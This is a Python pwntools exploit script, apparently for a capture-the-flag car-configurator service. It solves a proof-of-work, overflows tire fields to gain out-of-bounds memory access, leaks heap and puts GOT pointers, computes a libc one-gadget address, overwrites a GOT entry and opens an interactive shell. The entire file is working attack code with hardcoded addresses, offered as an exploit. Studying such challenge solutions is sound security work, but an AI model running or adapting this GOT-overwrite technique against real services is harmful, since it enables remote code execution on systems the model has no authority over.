import sys
from time import sleep
from pwn import *

SOCK = None

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

def connect_and_solve(ip, port, dopow):
    global SOCK
    SOCK = remote(ip, port)

    if dopow == 0:
        return

    print SOCK.recvline(timeout=1)
    chall = SOCK.recvline().strip().split(": ")[-1]
    print "Challenge:", chall
    nval = int(SOCK.recvline().strip().split(": ")[-1])
    print "N:", nval
    SOCK.recvline()
    solved = solve_pow(chall, nval)
    print "Solution:", solved
    SOCK.send("%s\n" % solved)
    print SOCK.recvline(timeout=1)

def select_tires( count ):
    global SOCK

    SOCK.send('1\n')
    SOCK.recvuntil('need?\n')
    SOCK.send( str(count) + '\n')
    SOCK.recvuntil('CHOICE: ')

def select_transmission( ):
    global SOCK

    SOCK.send('4\n')
    SOCK.recvuntil( '? ')

    ## Just select 5 speed since it doesn't matter
    SOCK.send( '1\n')
    SOCK.recvuntil('CHOICE: ')

def select_chassis( ):
    global SOCK

    SOCK.send('2\n')
    SOCK.recvuntil( 'eclipse\n')

    ## this doesn't matter
    SOCK.send('1\n')
    SOCK.recvuntil( 'CHOICE: ')

def select_engine( ):
    global SOCK

    SOCK.send( '3\n')
    SOCK.recvuntil( 'CHOICE: ')

def upgrade_tires( ):
    global SOCK

    SOCK.send('1\n')
    SOCK.recvuntil( 'CHOICE: ')
    SOCK.send('1\n')
    SOCK.recvuntil( 'width: ')
    SOCK.send('65535\n')
    SOCK.recvuntil( 'CHOICE: ')

    SOCK.send('1\n')
    SOCK.recvuntil( 'CHOICE: ')
    SOCK.send('2\n')  ## aspect ratio
    SOCK.recvuntil('_ratio: ')
    SOCK.send('65535\n')
    SOCK.recvuntil( 'CHOICE: ')

    SOCK.send('1\n')
    SOCK.recvuntil( 'CHOICE: ')
    SOCK.send('3\n')  ## construction
    SOCK.recvuntil('radial): ')
    SOCK.send('65535\n')
    SOCK.recvuntil( 'CHOICE: ')

    SOCK.send('1\n')
    SOCK.recvuntil( 'CHOICE: ')
    SOCK.send('4\n')  ## diameter
    SOCK.recvuntil('diameter: ')
    SOCK.send('65535\n')
    SOCK.recvuntil( 'CHOICE: ')


def leak_value( index ):
    global SOCK

    SOCK.send('4\n')
    SOCK.recvuntil( 'modify? ')
    SOCK.send( str(index) + '\n' )
    SOCK.recvuntil( 'is ')

    val = int(SOCK.recvuntil(', ')[:-2] )
    SOCK.recvuntil( ': ')
    SOCK.send('0\n')
    SOCK.recvuntil( 'no)')
    SOCK.send('0\n')
    SOCK.recvuntil( 'CHOICE: ')

    return val

def leak_heap( ):
    global SOCK

    heap_ptr = 0

    for i in range(8):
        heap_ptr |= (leak_value( 24 + i ) << (i * 8))

    print 'Heap pointer: %s' %(hex(heap_ptr))

    return heap_ptr

def leak_got( heap_ptr ):
    global SOCK

    puts_got = 0x603020
    heap_ptr -= 16  ## rebase the heap pointer to index 0

    index = (puts_got-heap_ptr) & 0xffffffffffffffff

    puts_ptr = 0

    for i in range(8):
        puts_ptr |= (leak_value( index + i ) << (i * 8))

    print 'Leaked puts() pointer: %s' %(hex(puts_ptr))

    return (puts_ptr, index)

def write_value ( index, value ):
    global SOCK

    SOCK.send('4\n')
    SOCK.recvuntil( 'modify? ')
    SOCK.send( str(index) + '\n' )
    SOCK.recvuntil( ': ')
    SOCK.send(str(value) + '\n')
    SOCK.recvuntil( 'no)')
    SOCK.send('1\n')
    SOCK.recvuntil( 'CHOICE: ')

def write_got( exit_index, addr ):
    for i in range(8):
        write_value( exit_index + i, addr & 0xff )
        addr >>= 8

def pwnit():
    global SOCK

    SOCK.recvuntil('CHOICE: ')

    raw_input('Attach via gdb to check the buffer: break *0x401245 and break *0x401352')
    ## Get the pointer to the tires
    select_tires(0x8000000)

    ## Allocate the transmission block
    select_transmission( )

    ## Now just set up the other two components
    select_chassis()
    select_engine()

    ## Overwrite the transmission gear count field with 0xffffffffffffffff. This gives us access to all of memory
    raw_input('To see the result: break *0x4014cb')
    upgrade_tires( )

    heap_ptr = leak_heap()

    puts_ptr, puts_index  = leak_got( heap_ptr )

    bin_sh_offset = 0xf1147
    puts_offset = 0x6f690

    diff = bin_sh_offset - puts_offset

    sh_addr = puts_ptr + diff

    print 'exec of /bin/sh at %s' %hex(sh_addr)

    write_got( puts_index + 0x40, sh_addr )

    SOCK.send('5\n')
    SOCK.recvuntil( 'CHOICE: ')
    SOCK.send('1\n')
    SOCK.recvuntil( 'need?\n')
    SOCK.send('1\n')
    SOCK.recvuntil('...\n')
    SOCK.interactive()

    SOCK.close()
    sys.exit()


def main():
    if len(sys.argv) < 3:
        print "Usage: %s <url> <port>" % sys.argv[0]
        sys.exit(-1)

    if sys.argv[1].find('local') != -1:
        dopow = 0
    else:
        dopow = 1

    connect_and_solve(sys.argv[1], sys.argv[2], dopow)
    pwnit()


if __name__ == '__main__':
    main()
